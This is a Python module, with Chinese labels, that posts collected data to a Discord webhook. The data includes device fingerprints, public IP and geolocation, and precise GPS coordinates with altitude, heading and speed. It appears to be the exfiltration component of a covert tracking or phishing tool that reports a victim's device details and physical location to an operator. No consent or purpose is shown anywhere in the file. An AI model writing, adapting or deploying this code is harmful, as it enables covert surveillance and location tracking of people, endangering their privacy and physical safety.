#!/usr/bin/env python3

import requests
from json import dumps, loads


def discord_sender(url, msg_type, content):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = {
            "content": None,
            "embeds": [
                {
                    "title": "设备信息",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "操作系统",
                            "value": json_content['os']
                        },
                        {
                            "name": "平台",
                            "value": json_content['platform']
                        },
                        {
                            "name": "浏览器",
                            "value": json_content['browser']
                        },
                        {
                            "name": "GPU 供应商",
                            "value": json_content['vendor']
                        },
                        {
                            "name": "GPU",
                            "value": json_content['render']
                        },
                        {
                            "name": "CPU 核心",
                            "value": json_content['cores']
                        },
                        {
                            "name": "内存",
                            "value": json_content['ram']
                        },
                        {
                            "name": "公网 IP",
                            "value": json_content['ip']
                        },
                        {
                            "name": "分辨率",
                            "value": f'{json_content["ht"]}x{json_content["wd"]}'
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=info_message, timeout=10)

    if msg_type == 'ip_info':
        ip_info_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "IP 信息",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "大洲",
                            "value": json_content['continent']
                        },
                        {
                            "name": "国家",
                            "value": json_content['country']
                        },
                        {
                            "name": "地区",
                            "value": json_content['region']
                        },
                        {
                            "name": "城市",
                            "value": json_content['city']
                        },
                        {
                            "name": "组织",
                            "value": json_content['org']
                        },
                        {
                            "name": "ISP",
                            "value": json_content['isp']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=ip_info_msg, timeout=10)

    if msg_type == 'location':
        location_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "位置信息",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "纬度",
                            "value": json_content['lat']
                        },
                        {
                            "name": "经度",
                            "value": json_content['lon']
                        },
                        {
                            "name": "精度",
                            "value": json_content['acc']
                        },
                        {
                            "name": "海拔",
                            "value": json_content['alt']
                        },
                        {
                            "name": "方向",
                            "value": json_content['dir']
                        },
                        {
                            "name": "速度",
                            "value": json_content['spd']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=location_msg, timeout=10)

    if msg_type == 'url':
        url_msg = {
            "content": json_content['url'],
            "embeds": None,
            "attachments": []
        }
        requests.post(url, json=url_msg, timeout=10)

    if msg_type == 'error':
        error_msg = {
            "content": None,
            "embeds": [
                {
                    "color": 16711680,
                    "fields": [
                        {
                            "name": "Error",
                            "value": json_content['error']
                        }
                    ]
                }
            ],
            "attachments": []
        }
        requests.post(url, json=error_msg, timeout=10)
